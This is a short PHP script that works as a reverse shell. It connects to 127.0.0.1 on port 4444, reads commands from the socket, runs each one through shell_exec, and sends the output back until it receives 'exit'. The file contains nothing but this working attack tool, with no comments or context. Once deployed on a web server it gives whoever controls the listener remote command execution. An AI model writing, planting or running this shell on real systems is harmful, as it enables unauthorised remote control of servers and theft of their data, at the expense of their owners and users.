<?php

    $ip = "127.0.0.1";
    $port = 4444;

    $sock = socket_create(AF_INET, SOCK_STREAM, 0) or die();
    socket_connect($sock, $ip, $port) or die();

    while (true) {
        $cmd = socket_read($sock, 1024) or die();
        
        if ($cmd == "exit") {
            die();

        }else {
            socket_write($sock, shell_exec($cmd));

        }

    }

?>